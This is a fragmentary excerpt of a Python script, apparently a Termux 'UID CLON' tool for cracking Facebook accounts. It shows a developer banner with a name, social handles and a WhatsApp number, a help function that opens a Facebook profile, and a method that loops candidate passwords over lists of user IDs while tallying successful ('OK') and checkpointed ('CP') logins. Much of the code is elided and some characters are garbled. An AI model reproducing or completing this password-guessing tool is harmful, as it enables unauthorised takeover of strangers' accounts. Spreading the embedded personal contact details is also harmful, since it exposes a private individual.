...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/Farhanmallik7556"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Farhanmallik7556")
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            FARHAN AHMED
     \033[1;91m➣ \033[1;92mFACEBOOK   :            FARHAN MALLIK
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01633579132
     \033[1;96m➣ \033[1;92mGITHUB     :            farhanmallik51
     \033[1;95m➣ \033[1;92mTOOLS      :            UID CLON
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s1.2"%(G,R,G,Y,G))
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [FARHAN] : \033[0;97m %s/%s -> \033[0;92m [FARHAN -OK:%s ]- \033[0;93m[ABIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
